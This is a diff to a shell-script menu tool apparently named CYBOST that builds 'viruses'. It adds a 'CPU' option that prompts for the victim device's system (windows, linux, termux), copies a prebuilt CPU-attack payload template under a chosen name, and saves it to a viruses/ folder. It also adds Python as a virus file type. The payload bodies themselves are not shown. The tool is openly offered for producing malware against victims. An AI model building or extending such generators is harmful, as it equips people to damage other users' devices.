@@ -58,7 +58,7 @@ PURPLE=$(printf "$purple")
                    printf "\n"
                    printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
                    read namevl
-                   printf "$RED ☢ Enter the virus file extension .c or .sh \n"
+                   printf "$RED ☢ Enter the virus file extension .c or .sh or .py\n"
                    printf "\n"
                    printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
                    read ext
@@ -122,7 +122,54 @@ PURPLE=$(printf "$purple")
              else
 			printf "$RED ✘ $os2:$WHITE Command Not Found\n"
 	     fi
+      elif [ $vi == "CPU" ]
+      then
+             printf "$RED ☢ Enter the system of the victim device (windows,termux,linux): \n"
+             printf "\n"
+             printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
+             read os5
+             if [ $os5 == "windows" ]
+	     then
+			printf "$RED ☢ The virus doesn't finished yet,Sorry!\n"
+	     elif [ $os5 == "linux" ]
+	     then
+                   printf "$RED ☢ Enter the Name of the virus:\n"
+                   printf "\n"
+                   printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
+                   read namev5
+                   printf "$RED ☢ Enter the virus file extension .c or .sh or .py \n"
+                   printf "\n"
+                   printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
+                   read ext5
+                   cd ..
+                   cd sae
+                   cd CPU
+                   cp cpulnx$ext5 $namev5$ext5
+                   cd ..
+                   cd ..
+                   mv sae/CPU/$namev5$ext5 viruses/
+                   printf "$RED ☢ $namev5$ext5 Saved at viruses/ \n"
+
+	     elif [ $os5 == "termux" ]
+	     then
+                   printf "$RED ☢ Enter the Name of the virus:\n"
+                   printf "\n"
+                   printf "$WHITE ─[$USER]─[CYBOST]$RED ─╼>$ "
+                   read namev6
+                   cd ..
+                   cd sae
+                   cd CPU
+                   cp cpulnx.sh $namev6.sh
+                   cd ..
+                   cd ..
+                   mv sae/CPU/$namev6.sh viruses/
+                   printf "$RED ☢ $namev6.sh Saved at viruses/ \n"
+	     else
+		   printf "$RED ✘ $os2:$WHITE Command Not Found\n"
+	     fi
+
+
       else
+
 		printf "$RED ✘ $vi:$WHITE Command Not Found\n"
       fi
-
